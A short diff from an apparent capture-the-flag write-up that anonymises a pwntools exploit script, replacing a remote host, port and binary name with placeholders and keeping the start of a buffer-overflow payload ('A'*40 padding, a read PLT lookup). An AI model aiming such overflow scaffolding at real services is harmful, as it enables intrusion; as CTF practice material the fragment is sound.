@@ -382,10 +382,10 @@ jmp     ds:dword_804A008
 from pwn import *
 context.log_level = 'debug'
 
-io = remote('192.168.210.11',10012)
-#io = process('./level12')
+io = remote('xxx.xxx.xxx.xx',xxxxx)
+#io = process('./binary')
 
-elf = ELF('level12')
+elf = ELF('binary')
 pattern = 'A'*40
 read_plt = elf.plt['read']
 
